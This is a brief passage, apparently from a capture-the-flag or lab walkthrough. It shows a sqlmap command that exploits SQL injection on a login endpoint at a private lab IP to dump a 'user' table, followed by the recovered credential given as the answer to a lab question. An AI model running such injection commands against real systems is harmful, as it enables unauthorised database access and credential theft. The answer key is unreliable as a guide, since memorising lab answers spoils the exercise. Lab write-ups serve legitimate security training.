### Step 3 — Dump the "user" Table

```bash
sqlmap -u 'http://10.145.135.211/ai/includes/user_login?email=test&password=test' -D ai -T user --dump --level=5
```

Found credentials for `test@chatai.com`

**Q3 Answer: 12345678** ✅

